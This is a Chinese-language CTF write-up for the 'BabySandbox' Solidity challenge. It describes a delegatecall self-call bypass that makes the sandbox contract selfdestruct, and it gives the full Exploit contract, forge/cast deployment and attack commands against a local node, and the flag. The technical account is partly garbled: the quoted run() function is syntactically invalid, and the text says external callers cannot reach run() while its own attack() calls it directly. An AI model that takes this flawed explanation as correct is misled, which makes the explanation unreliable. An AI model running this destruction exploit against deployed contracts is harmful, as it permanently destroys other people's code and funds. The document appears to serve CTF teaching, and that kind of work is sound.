# BabySandbox

## 题目描述

本题提供了一个 `BabySandbox` 合约，意图实现一个**安全沙箱**，用于安全执行外部代码。
合约通过 `msg.sender == address(this)` 来限制只有合约自身才能执行敏感逻辑。

## 目标：
- 绕过沙箱检查
- 销毁 `BabySandbox` 合约
- 使 `address(sandbox).code.length == 0`
- 最终让 `Setup.isSolved()` 返回 `true`

```solidity
contract Setup {
    BabySandbox public sandbox;

    constructor() {
        sandbox = new BabySandbox();
    }

    function isSolved() public view returns (bool) {
        return address(sandbox).code.length == 0;
    }
}
```

## 漏洞类型
Delegatecall 沙箱绕过  
未授权自调用漏洞  
selfdestruct 合约销毁  

## 漏洞原理
核心漏洞位于 BabySandbox.run(address) 函数：  
```solidity
function run(address what) external {
    require(msg.sender == address(this), "Not self");
    (bool ok, bytes memory res) = what.delegatecall(
        gas: 0x4000
    );
}
```
关键危险点：  
合约使用 ```delegatecall``` 执行外部代码  
合约信任 ```msg.sender == address(this)``` 这个检查  
合约允许外部触发第一次调用  
```delegatecall``` 保留 msg.sender、msg.value、gas 等上下文  

真正危险的地方：  
攻击者可以让合约 “自己调用自己”，从而绕过 ```msg.sender == address(this)``` 检查。  

## 攻击原理

核心：二次调用（Re-Entrance / Self-Call）  
攻击流程：  
攻击者部署恶意合约  
攻击者调用 ```sandbox.run```(攻击合约)  
沙箱会回调攻击合约  
攻击合约再次调用 sandbox.run(...)  
此时 ```msg.sender == address(sandbox)```  
检查被绕过  
攻击者在第二次调用中执行 ```selfdestruct```  

最终效果：  
沙箱合约被销毁  
合约代码长度变为 0  
```isSolved()``` → ```true```    

攻击步骤  
1.部署攻击合约 Exploit,传入目标沙箱地址。  

2.调用 ```attack()```，触发第一次沙箱调用。  

3.攻击合约的 ```receive()``` 被触发，再次调用沙箱（第二次调用）。    

4.第二次调用满足 ```msg.sender == address(this)```，检查通过。    

5.在第二次调用中执行```selfdestruct```,销毁沙箱合约。  

6.```address(sandbox).code.length == 0``` → ```isSolved() = true```.  

##  解题步骤  
1. 理解沙箱逻辑  
```solidity
function run(address what) external {
    require(msg.sender == address(this), "Not self");
    (bool ok, bytes memory res) = what.delegatecall(gas: 0x4000);
}
```
外部账户无法直接调用 run()，因为 msg.sender != address(this)  
但合约可以通过回调让沙箱自己调用自己  
2. 构造攻击合约  
关键点：  
第一次进入：再次发起调用  
第二次进入：执行 selfdestruct  
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

interface IBabySandbox {
    function run(address) external payable;
}

contract Exploit {
    address public target;
    bool public secondCall;

    constructor(address _target) {
        target = _target;
    }

    function attack() external {
        IBabySandbox(target).run{gas: 200000}(address(this));
    }

    receive() external payable {
        if (!secondCall) {
            secondCall = true;
            IBabySandbox(msg.sender).run{gas: 200000}(address(this));
        } else {
            selfdestruct(msg.sender);
        }
    }
}
```
3. 部署并攻击
```bash
# 部署
forge create Exploit \
--rpc-url http://127.0.0.1:8545 \
--private-key $PK \
--constructor-args $SANDBOX \
--broadcast

# 攻击
cast send $EXPLOIT "attack()" \
--rpc-url http://127.0.0.1:8545 \
--private-key $PK \
--gas-limit 1000000
```
4. 验证是否成功
```bash
cast call $SETUP "isSolved()" --rpc-url http://127.0.0.1:8545
# 输出 1 表示成功
```

## 关键代码解析  
核心绕过逻辑  
```solidity
receive() external payable {
    if (!secondCall) {
        // 第一次进入：让沙箱自己调用自己
        secondCall = true;
        IBabySandbox(msg.sender).run(address(this));
    } else {
        // 第二次进入：检查已通过，执行销毁
        selfdestruct(msg.sender);
    }
}
```
第一次 run()：msg.sender 是攻击者  
第二次 run()：msg.sender 是沙箱合约本身  
delegatecall 保留上下文，允许我们操作沙箱状态  
## Lessons Learned

- `msg.sender == address(this)` 并非绝对安全  
  合约可通过回调 / 重入实现自调用

- `delegatecall` 极其危险  
  被调用代码运行在调用者合约上下文中  
  可修改状态、转账、甚至销毁合约

- 沙箱设计必须严格隔离上下文  
  不能信任外部传入的地址  
  不能使用 `delegatecall` 执行未信任代码

- `selfdestruct` 是强力攻击手段  
  可永久销毁合约并清空代码  
  一旦执行不可恢复

- CTF 常见套路：二次调用绕过检查  
  第一次：触发回调  
  第二次：绕过权限检查

## Flag
**Flag**: `pctf{54ndb0x3d_57471c4ll5_4r3_54f3}`
